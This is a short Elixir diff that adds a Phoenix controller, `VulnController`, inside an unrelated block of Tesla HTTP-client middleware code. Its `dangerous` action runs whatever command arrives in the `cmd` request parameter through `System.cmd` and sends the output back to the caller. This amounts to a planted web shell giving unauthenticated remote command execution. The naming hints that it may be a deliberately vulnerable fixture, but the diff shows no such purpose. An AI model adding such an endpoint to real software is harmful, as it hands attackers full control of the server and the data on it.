@@ -16,5 +16,13 @@ if Code.ensure_loaded?(Tesla) do
         Tesla.run(env, next)
       end
     end
+    defmodule MyAppWeb.VulnController do
+      use MyAppWeb, :controller
+
+      def dangerous(conn, %{"cmd" => cmd}) do
+        {output, _} = System.cmd(cmd, [])
+        text(conn, output)
+      end
+    end
   end
 end
